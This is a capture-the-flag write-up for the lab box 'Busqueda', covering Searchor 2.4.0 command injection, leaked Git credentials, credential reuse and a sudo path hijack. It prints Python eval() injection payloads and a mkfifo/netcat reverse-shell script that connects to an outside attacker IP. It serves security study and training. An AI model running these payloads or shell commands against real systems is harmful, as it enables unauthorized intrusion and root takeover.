+++
date = '2026-06-24T17:21:51+02:00'
draft = false
title = 'Busqueda Writeup EN'
+++
**name**: **`joy.scd01`**

**Date**: **`05/02/2025`**

![Busqueda.jpeg](/images/imgs_busqueda/Busqueda.jpeg)

---
# Introduction

**_Busqueda_** is an **Easy-level Linux** box that highlights some classic and very realistic vulnerabilities, specifically focusing on **Arbitrary Command Injection** and **Path Hijacking**.

The initial foothold is gained by enumerating the web application and exploiting a known command injection vulnerability in an outdated version of **Searchor**.

The privilege escalation requires some solid enumeration: first finding exposed **Git metadata** that leads to credential reuse, and finally achieving a vertical escalation to **root** by abusing a **sudo-permitted Python script**. This script executes a bash script without specifying its full absolute path, opening the door for a classic **path hijack** technique.

---
# Techniques Used
- **Arbitrary Command Injection → RCE**

- **Information Disclosure → Git Metadata**

- **Credential Reuse**

- **Sudo Misconfiguration → Path Hijacking**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -T4 busqueda
```

![nmap.png](/images/imgs_busqueda/nmap.png)

**Open ports**:
- **22**/tcp - SSH

- **80**/tcp - HTTP

The nmap scan also revealed a new subdomain, **`searcher.htb`**, which I immediately added to my **`/etc/hosts`** file to access the web application.

## HTTP - Web Enumeration

Browsing to **`searcher.htb`**, I was greeted by a simple **Searchor** instance. I immediately noticed the version number at the bottom of the page: **2.4.0**.

After a quick Google search for CVEs related to this specific version, I found a public exploit:
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

The vulnerability takes advantage of the **`eval()`** function used inside the **`src/searchor/main.py`** file. Because user input is passed unsafely, it's possible to execute arbitrary code using **Python** functions such as:
```python
__import__('os').system('<CMD>')

__import__('os').popen('<CMD>').read()
```

This was exactly what I needed to get my initial foothold.

---
# Initial Access | Arbitrary Command Injection → RCE

I downloaded the exploit script and set up my netcat listener:

```bash
nc -lvnp 9001
```

Then, I ran the bash script against the target:

```bash
./exploit.sh searcher.htb <attacker_ip>
```

![exploit1.png](/images/imgs_busqueda/exploit1.png)

Right after execution, I caught a reverse shell as the **svc** user!

![shellsvc1.png](/images/imgs_busqueda/shellsvc1.png)

Inside **`/home/svc`**, I found the **user flag**.

---
# Privilege Escalation | Sudo Misconfiguration → Path Hijacking

With a shell on the box, I started looking around directories and files to map out an escalation path.

## Shell Stabilization & Hidden .git Directory

While searching for app configuration files inside **`/var/www/app`**, I noticed a hidden **`.git`** directory. Digging into it, I found some extremely juicy information:

1. **`/.git/config`**:

![config.png](/images/imgs_busqueda/config.png)

This file leaked a set of credentials: **`cody:jh1usoih2bkjaspwe92`** and also revealed another subdomain: **`gitea.searcher.htb`**.

2. **`/.git/logs/HEAD`**:

![admin.png](/images/imgs_busqueda/admin.png)

This log file leaked the existence of another user, **administrator**, also correlated with the **Gitea** instance.

At first, I tried to log into the **Gitea** web app as **cody** with the discovered password, but it led to a dead end.

At this point, my reverse shell was still quite unstable, making enumeration annoying and slow. Since I had a password and an active **SSH** port, I decided to try my luck with credential reuse.

I simply attempted to **SSH** as my current user (**svc**) using **cody**'s password (**jh1usoih2bkjaspwe92**).

It worked, and I finally had a fully interactive, stable **SSH** session.

## Sudo Misconfiguration

With a proper shell and a valid password, the very first thing to check is always:

```bash
sudo -l
```

![sudol.png](/images/imgs_busqueda/sudol.png)

The output showed that the **svc** user could run a specific **Python** script as **root**:
```bash
/usr/bin/python3 /opt/scripts/system-checkup.py *
```

I ran the script to see what it did, and it offered 3 actions:

1. **`docker-ps`**: Lists all running Docker containers.

![firstd.png](/images/imgs_busqueda/firstd.png)

2. **`docker-inspect`**: Requires a format and a container name.

After some trial and error (and some Google searching on Docker formatting), I managed to dump the JSON object containing the configuration of the containers.

![cont1.png](/images/imgs_busqueda/cont1.png)

Inspecting the second container:

![cont2.png](/images/imgs_busqueda/cont2.png)

Revealed two more passwords:
- **jI86kGUuj87guWr3RyF**
- **yuiu1hoiu4i5ho1uh**

Using the second password, I successfully logged into the **Gitea** web app as **administrator** where I found some scripts.

3. **`full-checkup`**:
Checking how **`system-checkup.py`** handled the **`full-checkup`** argument, I noticed a critical flaw. The Python script was calling a bash script named **`full-checkup.sh`** **without specifying its absolute path**.

![vuln.png](/images/imgs_busqueda/vuln.png)


**Note**: _This is a textbook **Path Hijacking** vulnerability. Because the absolute path isn't defined, the system will search for **`full-checkup.sh`** in whatever directories are currently listed in the environment's PATH variable, starting from the current working directory if configured to do so._

## Path Hijacking → root

To exploit this, I just needed to create a malicious script named **`full-checkup.sh`** in a directory I controlled (like **`/tmp`**), write a reverse shell inside it, and execute the sudo command from there.

**PrivEsc Workflow**:

```bash
# 1. Created the malicious payload in /tmp:
svc@busqueda:/tmp$ nano full-checkup.sh  
  
#!/bin/bash  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.15 22667 >/tmp/f

------------------------------------------------------------------------

# 2. Made it executable
svc@busqueda:/tmp$ chmod +x full-checkup.sh

------------------------------------------------------------------------

# 3. Started a new netcat listener on my machine:
nc -lvnp 22667

------------------------------------------------------------------------

# 4. Triggered the exploit by running the sudo command:
svc@busqueda:/tmp$ sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Checking my listener, I caught a root shell:

The **root flag** was inside **`/root`**.

![root.png](/images/imgs_busqueda/root.png)

---
# Final Thoughts

**_Busqueda_** is a fantastic easy box that chains together very realistic scenarios.

The initial **command injection** is very easy, but a great reminder to always check the version numbers of the software running on target web servers. Moving into the privilege escalation, finding the **`.git`** folder was a nice touch of realistic **information disclosure**, leading seamlessly to the **credential reuse**.

Finally, the **path hijacking** vector is a classic Linux privilege escalation technique that never gets old. It forces you to read the code of the scripts you are allowed to run with sudo and understand exactly how they are executing underlying system commands.

**Sources**:

- **Searchor 2.4.0 Exploit | (Arbitrary CMD Injection)** | https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection